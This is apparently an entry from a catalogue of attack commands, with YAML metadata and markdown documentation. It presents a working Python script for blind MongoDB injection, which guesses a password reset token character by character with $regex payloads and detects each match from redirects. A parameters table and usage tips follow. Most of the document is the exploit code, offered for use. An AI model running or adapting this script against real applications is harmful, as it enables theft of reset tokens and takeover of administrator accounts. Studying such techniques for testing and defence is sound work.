---
id: cmd-uuid-001
data: |-
  import requests

  url = 'http://localhost:4000/admin/verify'
  chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
  token = ''

  for pos in range(32):  # Assuming 32-char token
      for char in chars:
          payload = {'t': {'$regex': '^' + token + char}}
          r = requests.get(url, params=payload)
          if 'admin/sp/' in r.url:  # Redirect on match
              token += char
              break
      print(f'Current token: {token}')

  print(f'Full token: {token}')
tags:
  - injection
  - exploit
type: command
output: 'Full token: 5f8e9a2b1c3d4e5f6789a0b1c2d3e4f5'
executor: python
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:06.384Z'
verified: false
validated: true
submitted: true
---
# blind-mongodb-injection-script

## Command

```python
import requests

url = 'http://localhost:4000/admin/verify'
chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
token = ''

for pos in range(32):  # Assuming 32-char token
    for char in chars:
        payload = {'t': {'$regex': '^' + token + char}}
        r = requests.get(url, params=payload)
        if 'admin/sp/' in r.url:  # Redirect on match
            token += char
            break
    print(f'Current token: {token}')

print(f'Full token: {token}')
```

## Description

This Python script performs blind MongoDB injection to extract a password reset token by testing character prefixes with $regex and detecting matches via response redirects.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `url` | Base URL of the verify endpoint | Yes |
| `chars` | String of possible characters to guess | Yes |
| `range(32)` | Assumed token length; adjust as needed | No |

## Examples

### Basic Usage

```python
python blind_injection.py
```

### Advanced Usage

Modify chars for hex tokens: chars = 'abcdef0123456789'

## Expected Output

Progressive printing of token buildup, ending with full token string.

## Related

- [[Related Procedure: Extract-Reset-Token-via-Blind-Injection]]
